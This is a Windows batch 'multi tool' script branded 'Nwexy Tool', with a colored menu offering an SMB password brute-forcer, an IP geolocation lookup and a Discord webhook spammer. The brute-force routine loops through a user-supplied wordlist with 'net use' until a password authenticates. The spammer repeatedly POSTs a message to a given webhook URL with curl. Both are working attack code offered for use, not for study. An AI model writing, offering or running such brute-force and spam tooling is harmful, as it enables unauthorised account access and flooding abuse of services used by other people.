@echo off 
mode 125, 25
title Nwexy Tool
chcp 65001 > nul
color 0c
:basla
cls
echo.
echo [34m                  ██╗    ██╗██╗    ██╗███████╗██╗  ██╗    ████████╗ ██████╗  ██████╗ ██╗     
echo [94m                  ████╗  ██║██║    ██║██╔════╝╚██╗██╔╝    ╚══██╔══╝██╔═══██╗██╔═══██╗██║     
echo [36m                  ██╔██╗ ██║██║ █╗ ██║█████╗   ╚███╔╝        ██║   ██║   ██║██║   ██║██║     
echo [96m                  ██║╚██╗██║██║███╗██║██╔══╝   ██╔██╗        ██║   ██║   ██║██║   ██║██║     
echo [96m                  █║ ╚ ████║╚███╔███╔╝███████╗██╔╝ ██╗       ██║   ╚██████╔╝╚██████╔╝███████╗
echo [34m                  ╚═╝  ╚═══╝ ╚══╝╚══╝ ╚══════╝╚═╝  ╚═╝       ╚═╝    ╚═════╝  ╚═════╝ ╚══════╝
echo [94m                                            This Multi Tool Made By NweX
echo.

echo     [90;1m#═╦═══════»[95m[1][0m[0m  [92m[Bruteforce]
echo       [90;1m╚═══════»[95m[2][0m[0m  [92m[Bruteforce V2][0m[SOON]
echo       [90;1m╚═══════»[95m[3][0m[0m  [92m[IP Lookup][0m
echo       [90;1m╚═══════»[95m[4][0m[0m  [92m[Webhook Spammer][0m
echo       [90;1m╚═══════»[95m[5][0m[0m  [92m[Exit][0m
echo ======================================================================================================================

set /p secim="Choose One  : "
if "%secim%"=="" goto basla
if "%secim%"=="1" goto bruteforce
if "%secim%"=="2" goto bruteforcev2
if "%secim%"=="3" goto iplookup
if "%secim%"=="4" goto webhook
if "%secim%"=="5" goto exit
goto basla

:bruteforce
cls
echo.
echo  [========================================================================]
echo  [                  SMB BRUTEFORCE ATTACK TOOL (AUTO)		          ]
echo  [========================================================================]
echo.
echo  Detecting System Information...
echo.

set "user=%USERNAME%"
set "pcname=%COMPUTERNAME%"
set "ip=Unknown"

REM Attempt to get IPv4 address
for /f "tokens=2 delims=:" %%a in ('ipconfig ^| find "IPv4"') do set ip=%%a
REM Remove leading space from IP
set ip=%ip:~1%

echo  Target User      : %user%
echo  Target PC Name   : %pcname%
echo  Detected IP      : %ip%
echo.
echo  Enter Path to Wordlist (e.g., passlist.txt):
set /p wordlist=^> 
echo.
if not exist "%wordlist%" (
    echo  Wordlist not found! Error.
    timeout /t 3 >nul
    goto basla
)

echo  Starting SMB Attack on %pcname% (%ip%) with user %user%...
echo.
for /f "tokens=*" %%a in (%wordlist%) do (
    echo Trying password: %%a
    REM Using ComputerName is more reliable for local auth loopback than IP
    net use \\%pcname% /user:%user% "%%a" >nul 2>&1
    if not errorlevel 1 (
        echo.
        echo  [SUCCESS] Password Found: %%a
        echo.
        net use \\%pcname% /d /y >nul 2>&1
        pause
        goto basla
    )
)
echo.
echo  Attack Finished. Password not found in list.
pause
goto basla

:bruteforcev2
cls
echo.
echo  Coming Soon...
timeout /t 2 >nul
goto basla

:iplookup
cls
echo.
echo  ========================================================================
echo                            IP ADDRESS LOOKUP
echo  ========================================================================
echo.
set /p ip="Enter IP Address: "
echo.
echo  Fetching data for %ip%...
echo.
curl -s "http://ip-api.com/line/%ip%?fields=status,message,country,countryCode,region,regionName,city,zip,lat,lon,timezone,isp,org,as,query"
echo.
pause
goto basla

:webhook
cls
echo.
echo  ========================================================================
echo                          DISCORD WEBHOOK SPAMMER
echo  ========================================================================
echo.
set /p url="Enter Webhook URL (> ): "
echo.
set /p msg="Enter Message Content (> ): "
echo.
set /p amount="Enter Amount of Messages (> ): "
echo.
echo  Spamming started... Press Ctrl+C to stop manually.
echo.
for /L %%i in (1,1,%amount%) do (
    curl -H "Content-Type: application/json" -X POST -d "{\"content\": \"%msg%\"}" %url%
    echo.
    echo  [%%i/%amount%] Message Sent!
)
echo.
echo  Spamming Finished!
pause
goto basla

:exit
exit